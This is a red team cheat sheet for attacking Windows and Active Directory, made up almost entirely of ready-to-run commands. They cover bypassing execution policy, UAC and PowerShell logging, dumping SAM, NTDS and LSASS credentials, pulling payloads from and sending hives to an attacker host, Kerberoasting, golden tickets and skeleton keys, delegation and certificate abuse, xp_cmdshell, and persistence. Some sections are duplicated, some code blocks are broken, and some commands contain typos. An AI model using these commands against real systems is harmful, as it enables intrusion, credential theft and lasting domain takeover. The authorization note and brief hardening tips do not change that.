# Red Team Cheat Sheet

This cheat sheet reorganizes the Windows and Active Directory notes from `RedTeamingNotes` into a single-file format inspired by the Active Directory Exploitation Cheat Sheet.

Use these notes only in environments where you have explicit authorization.

## Summary

- [Red Team Cheat Sheet](#red-team-cheat-sheet)
  - [Summary](#summary)
  - [Tools and Resources](#tools-and-resources)
  - [General](#general)
  - [Initial Reconnaissance](#initial-reconnaissance)
  - [Domain Enumeration](#domain-enumeration)
  - [GPO Policy](#gpo-policy)
  - [Privilege Escalation](#privilege-escalation)
  - [UAC Bypass Methods](#uac-bypass-methods)
  - [Logging and Telemetry](#logging-and-telemetry)
  - [File Transfer](#file-transfer)
  - [Remote Execution](#remote-execution)
  - [RDP Hijacking](#rdp-hijacking)
  - [Authentication Relays](#authentication-relays)
  - [Active Directory Certificate Services](#active-directory-certificate-services)
  - [Credential Harvesting](#credential-harvesting)
  - [Kerberoasting](#kerberoasting)
  - [Pass-the-Hash and Kerberos Abuse](#pass-the-hash-and-kerberos-abuse)
  - [Delegation Abuse](#delegation-abuse)
  - [Forest and Trust Abuse](#forest-and-trust-abuse)
  - [MSSQL Trust Abuse](#mssql-trust-abuse)
  - [Persistence](#persistence)
  - [OPSEC and Defenses](#opsec-and-defenses)

## Tools and Resources

- [Active Directory Exploitation Cheat Sheet](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet)
- [WADComs](https://wadcoms.github.io/)
- [API Monitor](http://www.rohitab.com/apimonitor)
- [LOLBAS](https://lolbas-project.github.io/)
- [MITRE ATT&CK for Windows](https://attack.mitre.org/matrices/enterprise/windows/)
- [SpecterOps Posts](https://posts.specterops.io/)
- [MDSec Insights](https://www.mdsec.co.uk/knowledge-centre/insights/)
- [Outflank Blog](https://www.outflank.nl/blog/)
- [PowerSploit](https://github.com/PowerShellMafia/PowerSploit)
- [PowerView](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon)
- [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL)
- [Powermad](https://github.com/Kevin-Robertson/Powermad)
- [Impacket](https://github.com/fortra/impacket)
- [Mimikatz](https://github.com/gentilkiwi/mimikatz)
- [Rubeus](https://github.com/GhostPack/Rubeus)
- [Certify](https://github.com/GhostPack/Certify)
- [ForgeCert](https://github.com/GhostPack/ForgeCert)
- [BloodHound](https://github.com/BloodHoundAD/BloodHound)

## General

- **Bypass PowerShell execution policy:**

  ```powershell
  Set-ExecutionPolicy Bypass -Scope Process
  $env:PSExecutionPolicyPreference = "bypass"
  ```
  
- **Use domain credentials from a non-domain joined host:**

  ```cmd
  runas.exe /netonly /user:<DomainName>\<Username> cmd.exe
  ```

- **Set DNS to the domain controller when resolution is not configured:**

  ```powershell
  $dnsip = "<DCIP>"
  $index = Get-NetAdapter -Name "Ethernet" | Select-Object -ExpandProperty ifIndex
  Set-DnsClientServerAddress -InterfaceIndex $index -ServerAddresses $dnsip
  ```

## Initial Reconnaissance

- **Conextual Awareness:**

  ```powershell
  # Host/Domain context
  systeminfo
  
  # Check the proccesses
  Get-Process
  
  # Scheduled execution surface
  Get-ScheduledTask

  # Service inventory
  Get-CimInstance Win32_Service | Select Name, DisplayName, State, ProcessId, PathName
  
  # Nearby LAN machines
  arp -a

  # Connections and listeners 
  netstat -ano

  # IP, DNS, gateway, subnet context
  ipconfig /all

  # Defender posture
  Get-MpComputerStatus

  # Firewall rule surface
  Get-NetFirewallRule | select DisplayName, Enabled, Direction, Action

  # Locate Security Product binary
  Get-ChildItem -Path C:\ -Include MsSense.exe -File -Recurse -ErrorAction SilentlyContinue

  # AV detection (Workstation only, not servers)
  wmic /namespace:\root\securitycenter2 path antivirusproduct
  ```
- **User, Group and Share Enumeration:**

  ```powershell
  # Domain password policy
  net accounts /domain
  
  # Privileges in current token
  whoami /priv

  # Group-based access
  whoami /groups

  # List local users
  net user

  # Local SMB exposure
  net share
  
  # List domain users
  net user /domain

  # List local groups
  net group

  # List domain groups
  net group /domain

  # List local machine groups
  net localgroup

  # List local Administrators group members
  net localgroup administrators

  # Query a specific domain user
  net user 0xIapetus /domain
  
- **Port and Host Discovery:**

  ```powershell
  # Local port range check
  for($i=130; $i -le 140; $i++){Test-NetConnection localhost -Port $i}

  # Find live hosts in subnet
  1..255 | %{echo "10.10.168.$_"; ping -n 1 10.10.168.$_ | Select-String ttl}

  # TCP sweep one host
  1..1024 | %{echo ((New-Object Net.Sockets.TcpClient).Connect("10.0.2.8", $_)) "Open port on - $_"} 2>$null
  ```

## Domain Enumeration

- **DNS and Domain Context:**

  ```powershell
  # Uncover Domain Controllers via DNS SRV type, cmd only
  nslookup -type=srv _ldap._tcp.goblins.local 
   
  # Current domain context
  Get-Domain

  #  Get Specific domain 
  Get-Domain -Domain <DomainName>


  # Domain SID
  Get-DomainSID

  ```

- **Domain Policy and Controllers:**

  ```powershell
  # Domain policy
  Get-DomainPolicyData

  # Password policy
  (Get-DomainPolicyData).SystemAccess

  # Kerberos policy
  (Get-DomainPolicyData).KerberosPolicy

  # Target domain password policy
  (Get-DomainPolicyData -Domain <DomainName>).SystemAccess

  # Domain controllers
  Get-DomainController

  # Target domain controllers
  Get-DomainController -Domain <DomainName>

  ```

- **Users and Interesting Attributes:**

  ```powershell
  # All domain users
  Get-DomainUser

  # Specific user
  Get-DomainUser -Identity <Username>

  # Usernames and logon count
  Get-DomainUser -Properties SamAccountName,LogonCount

  # User membership context
  Get-DomainUser -Identity <Username> -Properties DisplayName,MemberOf | Format-List

  # User property discovery
  Get-UserProperty

  # Check for active users with high logoncount
  et-DomainUser -Properties samaccountname,logonCount

  # Description field loot
  Get-DomainUser -LDAPFilter "Description=*pass*" | Select name,Description
  ```

- **Groups and Admin Paths:**

  ```powershell
  # All domain groups
  Get-DomainGroup | Select-Object Name
  
  # Target domain groups
  Get-DomainGroup -Domain <DomainName>

  # Admin-like domain groups 
  Get-DomainGroup *admin*

  # Admin-like net groups 
  Get-NetGroup *admin*

  # Domain Admins membership
  Get-DomainGroupMember -Identity "Domain Admins" -Recurse

  # Domain Admins via AD module
  Get-ADGroupMember -Identity "Domain Admins" -Recursive

  # User group memberships
  Get-DomainGroup -UserName <Username>

  ```

- **Computers and Live Hosts:**

  ```powershell

  # Domain computers
  Get-DomainComputer -Properties OperatingSystem,Name,DnsHostName | Sort-Object DnsHostName

  # Server OS targets
  Get-DomainComputer -OperatingSystem "*Server 2016*"


  ```

- **Sessions and User Hunting:**

  ```powershell
  # Logged-on users
  Get-NetLoggedon -ComputerName <ComputerName>

  # Active sessions
  Get-NetSession -ComputerName <ComputerName>

  # Local logon history
  Get-LoggedonLocal -ComputerName <ComputerName>

  # Last logged-on user
  Get-LastLoggedOn -ComputerName <ComputerName>

  # Find where users are active
  Find-DomainUserLocation

  # Find users in target domain
  Find-DomainUserLocation -Domain <DomainName> | Select-Object UserName,SessionFromName

  # Stealthier user hunting
  Find-DomainUserLocation -Stealth
  ```

- **Shares and SYSVOL:**

  ```powershell
  # Domain shares
  Find-DomainShare

  # Readable domain shares
  Find-DomainShare -CheckShareAccess

  # Host share listing
  Get-NetShare -ComputerName <ComputerName>

  # SYSVOL over Kerberos (GPO and script share loot)
  dir \\<DomainName>\SYSVOL

  # SYSVOL over NTLM (GPO and script share loot)
  dir \\<DCIP>\SYSVOL
  ```

- **GPOs and OUs:**

  ```powershell
  # All GPOs
  Get-DomainGPO

  # GPOs linked to a computer
  Get-DomainGPO -ComputerIdentity <ComputerName>

  # GPO local group changes
  Get-DomainGPOLocalGroup

  # Computer local admin via GPO
  Get-DomainGPOComputerLocalGroupMapping -ComputerIdentity <ComputerName>

  # User local admin via GPO
  Get-DomainGPOUserLocalGroupMapping -Identity <Username> -Verbose

  # All OUs
  Get-DomainOU

  # OU-linked GPOs
  Get-DomainOU | Select-Object Name,GPLink

  # Effective AppLocker policy
  Get-AppLockerPolicy -Effective | Select-Object -ExpandProperty RuleCollections
  ```

- **ACLs and Object Control:**

  ```powershell
  # Object ACLs
  Get-DomainObjectAcl -SamAccountName <AccountName> -ResolveGUIDs

  # Interesting ACLs
  Find-InterestingDomainAcl -ResolveGUIDs

  # ACLs owned by a user
  Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {$_.IdentityReferenceName -match "<Username>"}

  # Object owner
  Get-DomainObjectOwner -Identity <AccountName>
  ```

- **Trusts and Forests:**

  ```powershell
  # Domain trusts
  Get-DomainTrust



  # Target domain trust
  Get-DomainTrust -Domain <DomainName>

  # Current forest
  Get-Forest


  # Target forest
  Get-Forest -Forest <ForestName>

  # Forest trusts
  Get-ForestTrust

  # Global catalogs
  Get-ForestGlobalCatalog
  ```

- **Local Groups on Domain Hosts:**

  ```powershell
  # Local groups on host
  Get-NetLocalGroup -ComputerName <ComputerName> -ListGroups

  # Local group members
  Get-NetLocalGroupMember -ComputerName <ComputerName> -GroupName Administrators

  # Recursive local admin view
  Get-NetLocalGroup -ComputerName <ComputerName> -Recurse
  ```

- **BloodHound Collection:**

  ```powershell
  # Full BloodHound collection
  Invoke-BloodHound -CollectionMethod All

  # Full collection without touching DC (maybe stealthier)
  Invoke-BloodHound -CollectionMethod All -ExcludeDC


## Domain Enumeration

### DNS and Domain Basics

- **Discover domain controllers through SRV records:**

  ```bash
  dig -t SRV _ldap._tcp.<DomainName>
  nslookup -type=srv _ldap._tcp.<DomainName>
  Resolve-DnsName -Type SRV _ldap._tcp.<DomainName>
  ```

- **Load AD tooling and query the current domain:**

  ```powershell
  Import-Module C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll
  Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1
  Get-Domain
  Get-ADDomain
  Get-DomainSID
  (Get-ADDomain).DomainSID
  ```

### Users, Groups, Computers, and Sessions

```powershell
Get-DomainUser -Properties samaccountname,logonCount
Get-DomainUser -LDAPFilter "Description=*pass*" | Select-Object Name, Description
Get-ADUser -Filter * -Properties *
Get-DomainGroup *admin*
Get-ADGroup -Filter 'Name -like "*admin*"' | Select-Object Name
Get-DomainGroupMember -Identity "Domain Admins" -Recurse
Get-ADGroupMember -Identity "Domain Admins" -Recursive
Get-DomainComputer -Ping
Get-ADComputer -Filter * -Properties DNSHostName | % { Test-Connection -Count 1 -ComputerName $_.DNSHostName }
Get-NetLoggedon -ComputerName <TargetHost>
Get-NetSession -ComputerName <TargetHost>
Get-LastLoggedOn -ComputerName <TargetHost>
```

### Shares, SYSVOL, Trusts, and Forests

```powershell
Invoke-ShareFinder -Verbose
Invoke-FileFinder -Verbose
Get-NetFileServer
dir \\<DomainName>\SYSVOL
dir \\<DCIP>\SYSVOL
Get-DomainTrust
Get-ADTrust -Filter *
Get-Forest
Get-ADForest
(Get-ADForest).Domains
Get-ForestTrust
Get-ADForest | Select-Object -ExpandProperty GlobalCatalogs
```

### BloodHound

```powershell
. C:\AD\Tools\BloodHound-master\Collectors\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All
.\SharpHound.exe --CollectionMethods All --Domain <DomainName> --ExcludeDCs
neo4j console
bloodhound
```

## GPO Policy

- **Enumerate GPOs, OUs, local group mappings, ACLs, and trust policy:**

  ```powershell
  Get-DomainGPO
  Get-DomainGPO -ComputerIdentity <ComputerName>
  Get-DomainGPOLocalGroup
  Get-DomainGPOComputerLocalGroupMapping -ComputerIdentity <ComputerName>
  Get-DomainGPOUserLocalGroupMapping -Identity <Username> -Verbose
  Get-DomainOU
  Get-ADOrganizationalUnit -Filter * -Properties *
  Get-DomainObjectAcl -Identity <ObjectName> -ResolveGUIDs
  Find-InterestingDomainAcl -ResolveGUIDs
  Get-PathAcl -Path "\\<DC>\SYSVOL"
  ```

- **Edit GPOs through MMC after credential injection:**

  ```cmd
  runas /netonly /user:<DomainName>\<Username> cmd.exe
  mmc
  ```

Use **File -> Add/Remove Snap-in -> Group Policy Management** and edit the target policy. For local group abuse, add the controlled principal to privileged local groups such as `Administrators` or `Remote Desktop Users` where the assessment allows it.

## Privilege Escalation

### Credential and Configuration Discovery

```cmd
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```

### Scheduled Task Abuse

```cmd
schtasks /query /tn <TaskName> /fo list /v
icacls C:\Path\To\TaskFile.bat
echo <Command> > C:\Path\To\TaskFile.bat
schtasks /run /tn <TaskName>
```

### Service Abuse

```powershell
Get-WmiObject win32_service | Select-Object Name, DisplayName, State, PathName
Get-ServiceUnquoted -Verbose
Get-ModifiableServiceFile -Verbose
Get-ModifiableService -Verbose
sc.exe config <ServiceName> binPath= "<Command>" start= auto obj= "LocalSystem"
sc.exe stop <ServiceName>
sc.exe start <ServiceName>
```

### SeBackup and SeRestore

```cmd
reg save HKLM\SYSTEM C:\Users\<Username>\system.hive
reg save HKLM\SAM C:\Users\<Username>\sam.hive
copy C:\Users\<Username>\sam.hive \\<AttackerIP>\share\
copy C:\Users\<Username>\system.hive \\<AttackerIP>\share\
```

```bash
impacket-smbserver -smb2support -username <Username> -password <Password> share ./share
secretsdump.py -sam sam.hive -system system.hive LOCAL
psexec.py -hashes <LMHash>:<NTHash> <DomainName>/<Username>@<TargetHost>
```

### RID Hijacking

```cmd
wmic useraccount get name,sid
PsExec64.exe -i -s regedit
```

Navigate to `HKLM\SAM\SAM\Domains\Account\Users\`, identify the target RID in hex, and modify the `F` value only in an authorized lab.

## UAC Bypass Methods

- **Check integrity level:**

  ```cmd
  whoami /groups | find "Label"
  ```

- **Fodhelper-style registry hijack pattern:**

  ```cmd
  set CMD="powershell -windowstyle hidden <Command>"
  reg add "HKCU\Software\Classes\.Servic3\Shell\Open\command" /d %CMD% /f
  reg add "HKCU\Software\Classes\ms-settings\CurVer" /d ".Servic3" /f
  fodhelper.exe
  reg delete "HKCU\Software\Classes\.Servic3\" /f
  reg delete "HKCU\Software\Classes\ms-settings\" /f
  ```

## Logging and Telemetry

### PowerShell Logging and ETW

```powershell
$logProvider = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
$etwProvider = $logProvider.GetField('etwProvider','NonPublic,Static').GetValue($null)
[System.Diagnostics.Eventing.EventProvider].GetField('m_enabled','NonPublic,Instance').SetValue($etwProvider,0)
```

```powershell
$GroupPolicySettingsField = [ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings','NonPublic,Static')
$GroupPolicySettings = $GroupPolicySettingsField.GetValue($null)
$GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockLogging'] = 0
$GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockInvocationLogging'] = 0
```

### Event Logs and Sysmon

```powershell
Get-EventLog -List
Get-Process | Where-Object { $_.ProcessName -eq "Sysmon" }
Get-CimInstance win32_service -Filter "Description = 'System Monitor service'"
Get-Service | Where-Object { $_.DisplayName -like "*sysm*" }
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Sysmon/Operational
```

## File Transfer

```powershell
Invoke-WebRequest http://<AttackerIP>/payload.exe -UserAgent ([Microsoft.PowerShell.Commands.PSUserAgent]::Chrome) -OutFile payload.exe
(New-Object Net.WebClient).DownloadFile('http://<AttackerIP>/payload.exe','C:\Windows\Temp\payload.exe')
certutil -urlcache -split -f http://<AttackerIP>/payload.exe C:\Windows\Temp\payload.exe
bitsadmin.exe /transfer /Download /priority Foreground http://<AttackerIP>/payload.exe C:\Windows\Temp\payload.exe
findstr /V dummystring \\<Host>\Share\payload.exe > C:\Windows\Temp\payload.exe
scp C:\Temp\bloodhound.zip user@<TargetHost>:/tmp/bloodhound.zip
```

## Remote Execution

### Common Credential Object

```powershell
$username = '<Username>'
$password = '<Password>'
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
```

### PsExec, WinRM, WMI, Services, and Tasks

```cmd
psexec64.exe \\<TargetHost> -u <Username> -p <Password> -i cmd.exe
winrs.exe -u:<Username> -p:<Password> -r:<TargetHost> cmd
sc.exe \\<TargetHost> create <ServiceName> binPath= "<Command>" start= auto
sc.exe \\<TargetHost> start <ServiceName>
schtasks /s <TargetHost> /RU SYSTEM /create /tn <TaskName> /tr "<Command>" /sc ONCE /st 00:00
schtasks /s <TargetHost> /run /tn <TaskName>
schtasks /s <TargetHost> /delete /tn <TaskName> /f
```

```powershell
Enter-PSSession -ComputerName <TargetHost> -Credential $credential
Invoke-Command -ComputerName <TargetHost> -Credential $credential -ScriptBlock { whoami }
$opt = New-CimSessionOption -Protocol DCOM
$session = New-CimSession -ComputerName <TargetHost> -Credential $credential -SessionOption $opt
Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{ CommandLine = '<Command>' }
```

## RDP Hijacking

```cmd
PsExec64.exe -s cmd.exe
query user
tscon <DisconnectedSessionID> /dest:<CurrentRDPSessionName>
```

## Authentication Relays

### LDAP Pass-back and Responder

```bash
sudo apt-get update && sudo apt-get -y install slapd ldap-utils
sudo dpkg-reconfigure -p low slapd
sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif
sudo service slapd restart
sudo tcpdump -SX -i <Interface> tcp port 389
sudo responder -I <Interface>
```

### NTLM Relay Flow

```bash
nmap --script=smb2-security-mode -p445 <TargetHost1> <TargetHost2>
python3 /opt/impacket/examples/ntlmrelayx.py -smb2support -t smb://<TargetHost> -debug
```

```cmd
SpoolSample.exe <CoerceFromHost> <AttackerIP>
```

## Active Directory Certificate Services

### Enumeration

```cmd
certutil -Template -v > templates.txt
Certify.exe cas
Certify.exe find
Certify.exe find /vulnerable
Certify.exe find /enrolleeSuppliesSubject
```

Look for templates or CA settings that combine client authentication, enrollee-supplied subject, exportable private keys, weak enrollment permissions, or `EDITF_ATTRIBUTESUBJECTALTNAME2`.

### Certificate Request and TGT

```cmd
Certify.exe request /ca:<CAHost>\<CAName> /template:<TemplateName> /altname:<TargetUPN>
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
Rubeus.exe asktgt /user:<Username> /domain:<DomainName> /dc:<DC> /certificate:<PathToPfx> /password:<Password> /ptt
```

### Certificate Authority Key Abuse

```cmd
mimikatz # crypto::certificates /systemstore:local_machine
mimikatz # privilege::debug
mimikatz # crypto::capi
mimikatz # crypto::cng
mimikatz # crypto::certificates /systemstore:local_machine /export
ForgeCert.exe --CaCertPath <CA>.pfx --CaCertPassword <Password> --Subject CN=User --SubjectAltName <TargetUPN> --NewCertPath forged.pfx --NewCertPassword <Password>
```

## Credential Harvesting

### Local SAM, SYSTEM, and NTDS

```cmd
wmic shadowcopy call create Volume='C:\'
vssadmin list shadows
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\Temp\sam
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\Temp\system
reg save HKLM\sam C:\Temp\sam
reg save HKLM\system C:\Temp\system
ntdsutil.exe "ac i ntds" "ifm" "create full c:\temp" q q
```

```bash
secretsdump.py -sam sam -system system LOCAL
secretsdump.py -security SECURITY -system SYSTEM -ntds ntds.dit LOCAL
```

### LSASS, Credential Manager, and LAPS

```cmd
reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
mimikatz # sekurlsa::credman
mimikatz # vault::cred /patch
vaultcmd /list
cmdkey /list
```

```powershell
Find-AdmPwdExtendedRights -Identity *
Get-AdmPwdPassword -ComputerName <ComputerName>
```

## Kerberoasting

```powershell
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
Get-DomainUser -SPN
Get-DomainUser -PreauthNotRequired -Verbose
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth
```

```cmd
Rubeus.exe kerberoast /stats
Rubeus.exe kerberoast /stats /rc4opsec
Rubeus.exe kerberoast /user:<ServiceAccount> /simple /rc4opsec
Rubeus.exe kerberoast /rc4opsec /outfile:hashes.txt
```

```powershell
Find-InterestingDomainAcl -ResolveGUIDs | ? { $_.IdentityReferenceName -match "<GroupName>" }
Set-DomainObject -Identity <TargetUser> -Set @{serviceprincipalname='ops/<UniqueHostName>'}
Rubeus.exe kerberoast /outfile:targetedhashes.txt
```

```bash
GetUserSPNs.py -dc-ip <DCIP> <DomainName>/<Username> -request
GetNPUsers.py -dc-ip <DCIP> <DomainName>/ -usersfile users.txt
john --wordlist=<Wordlist> hashes.txt
```

## Pass-the-Hash and Kerberos Abuse

### Overpass-the-Hash and Ticket Injection

```powershell
Invoke-Mimikatz -Command '"sekurlsa::pth /user:<Username> /domain:<DomainName> /aes256:<AESKey> /run:powershell.exe"'
Rubeus.exe asktgt /user:<Username> /rc4:<NTLMHash> /ptt
Rubeus.exe asktgt /user:<Username> /aes256:<AESKey> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
mimikatz # kerberos::ptt <Ticket>.kirbi
```

### Golden, Silver, Skeleton, and DSRM

```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:<DomainName>\krbtgt"'
Invoke-Mimikatz -Command '"kerberos::golden /user:<Username> /domain:<DomainName> /sid:<DomainSID> /krbtgt:<KRBTGTHash> /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
Invoke-Mimikatz -Command '"kerberos::golden /domain:<DomainName> /sid:<DomainSID> /target:<TargetHost> /service:cifs /rc4:<MachineHash> /user:<Username> /ptt"'
Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName <DC>
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -ComputerName <DC>
```

```powershell
New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehaviour" -Value 2 -PropertyType DWORD -Verbose
```

### Custom SSP

```powershell
$packages = Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' | Select-Object -ExpandProperty 'Security Packages'
$packages += "mimilib"
Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' -Value $packages
Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name 'Security Packages' -Value $packages
```

## Delegation Abuse

### Permission Delegation

- `ForceChangePassword`: reset a user's password without knowing the current value.
- `AddMembers`: add users, groups, or computers to the target group.
- `GenericAll`: full control over an AD object.
- `GenericWrite`: modify writable object attributes, such as SPNs or logon scripts.
- `WriteOwner`: take ownership and then change permissions.
- `WriteDACL`: add ACEs to grant additional rights.
- `AllExtendedRights`: perform extended actions such as password reset.

```powershell
Add-ADGroupMember -Identity <GroupName> -Members <Username>
Set-ADAccountPassword -Identity <Username> -Reset -NewPassword (ConvertTo-SecureString '<Password>' -AsPlainText -Force)
Add-DomainObjectAcl -TargetIdentity '<TargetDN>' -PrincipalIdentity <Username> -Rights All -Verbose
Set-DomainUserPassword -Identity <Username> -AccountPassword (ConvertTo-SecureString '<Password>' -AsPlainText -Force) -Verbose
```

### Unconstrained Delegation

```powershell
Get-DomainComputer -UnConstrained
Get-ADComputer -Filter {TrustedForDelegation -eq $True}
Rubeus.exe monitor /interval:5 /nowrap
SpoolSample.exe <DC> <DelegationHost>
Rubeus.exe ptt /ticket:<Base64Ticket>
Invoke-Mimikatz -Command '"lsadump::dcsync /user:<DomainName>\krbtgt"'
```

### Constrained Delegation

```powershell
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
Rubeus.exe s4u /user:<ServiceAccount> /aes256:<AESKey> /impersonateuser:<Username> /msdsspn:CIFS/<TargetHost> /ptt
```

### Resource-Based Constrained Delegation

```powershell
Get-ADDomain | Select-Object -ExpandProperty DistinguishedName | Get-ADObject -Properties 'ms-DS-MachineAccountQuota'
Import-Module .\Powermad.ps1
$password = ConvertTo-SecureString '<Password>' -AsPlainText -Force
New-MachineAccount -MachineAccount <MachineAccount> -Password $password
Set-ADComputer -Identity <TargetHost> -PrincipalsAllowedToDelegateToAccount '<MachineAccount>$'
Rubeus.exe s4u /user:<MachineAccount>$ /aes256:<AESKey> /msdsspn:http/<TargetHost> /impersonateuser:<Username> /ptt
```

## Forest and Trust Abuse

### SID History and Trust Tickets

```powershell
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName <ChildDC>
Invoke-Mimikatz -Command '"kerberos::golden /user:<Username> /domain:<ChildDomain> /sid:<ChildDomainSID> /sids:<EnterpriseAdminsSID> /rc4:<TrustKey> /service:krbtgt /target:<ParentDomain> /ticket:C:\Temp\trust_tkt.kirbi"'
Rubeus.exe asktgs /ticket:C:\Temp\trust_tkt.kirbi /service:cifs/<ParentDC> /dc:<ParentDC> /ptt
```

### Child-to-Parent With KRBTGT

```powershell
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
Invoke-Mimikatz -Command '"kerberos::golden /user:<Username> /domain:<ChildDomain> /sid:<ChildDomainSID> /sids:<EnterpriseAdminsSID> /krbtgt:<KRBTGTHash> /ticket:C:\Temp\krbtgt_tkt.kirbi"'
Invoke-Mimikatz -Command '"kerberos::ptt C:\Temp\krbtgt_tkt.kirbi"'
```

## MSSQL Trust Abuse

```powershell
Get-SQLInstanceDomain
Get-SQLConnectionTestThreaded
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
Get-SQLServerLink -Instance <SQLInstance> -Verbose
Get-SQLServerLinkCrawl -Instance <SQLInstance> -Verbose
Get-SQLServerLinkCrawl -Instance <SQLInstance> -Query "exec master..xp_cmdshell 'whoami'"
Get-SQLServerLinkCrawl -Instance <SQLInstance> -Query "exec master..xp_cmdshell 'whoami'" -QueryTarget <LinkedSQLInstance>
```

Enable `xp_cmdshell` only where explicitly allowed:

```sql
EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT "<LinkedSQLInstance>"
```

## Persistence

### Local Persistence

```cmd
sc.exe create <ServiceName> binPath= "C:\Windows\<Payload>.exe" start= auto
schtasks /create /sc minute /mo 1 /tn <TaskName> /tr "<Command>" /ru SYSTEM
```

Common locations and keys:

- `C:\Users\<Username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup`
- `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell`
- `HKCU\Environment\UserInitMprLogonScript`

### AD Persistence

```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /domain:<DomainName> /all"'
Invoke-Mimikatz -Command '"kerberos::golden /user:<Username> /domain:<DomainName> /id:500 /sid:<DomainSID> /krbtgt:<KRBTGTHash> /endin:600 /renewmax:10080 /ptt"'
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,<DomainDN>' -PrincipalIdentity <Username> -Rights All -Verbose
Add-ADGroupMember -Identity 'Domain Admins' -Members <NestedGroup>
```

### GPO Persistence

- Place payloads in SYSVOL scripts where explicitly authorized.
- Create or edit a linked GPO for the target OU.
- Add a logon script under **User Configuration -> Policies -> Windows Settings -> Scripts**.
- Review delegation so the policy can still be read and applied by computers.

## OPSEC and Defenses

### Defensive Hardening Notes

- Reduce the number of Domain Admins and Enterprise Admins.
- Restrict Domain Admin logon to Domain Controllers or hardened admin workstations.
- Avoid running services as Domain Admins.
- Mark privileged accounts as **Account is sensitive and cannot be delegated**.
- Test before adding privileged users to **Protected Users**.
- Use Privileged Administrative Workstations (PAWs) for high-risk administration.
- Deploy LAPS or Windows LAPS with tightly scoped read permissions.
- Use Just-In-Time and Just-Enough-Administration where possible.
- Monitor GPO, AdminSDHolder, certificate template, delegation, and trust changes.

### Offensive OPSEC Reminders

- Prefer AES keys where possible and avoid suspicious ticket lifetimes.
- Avoid noisy all-host sweeps unless the engagement allows them.
- Check whether tools touch LSASS, install drivers, create services, or write payloads to disk.
- Silver tickets can reduce DC traffic but require service-specific planning.
- Kerberoasting and ACL abuse can be quieter than interactive lateral movement.
- Credential Guard and Protected Users protect LSASS-derived material, not SAM, LSA Secrets, or service account secrets in the registry.
- Always confirm account SIDs; RID `500` may indicate a renamed built-in Administrator.

### Behavioural Bypass Pattern

If a remote host blocks direct downloads from an external address, stage the loader locally, copy it to the target, or use port proxying so the target appears to retrieve content from an allowed local path.

```cmd
winrs -r:<TargetHost> hostname && whoami
iwr http://<AttackerIP>/Loader.exe -OutFile C:\Users\Public\Loader.exe
echo F | xcopy C:\Users\Public\Loader.exe \\<TargetHost>\C$\Users\Public\Loader.exe
winrs -r:<TargetHost> "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=<AttackerIP>"
```
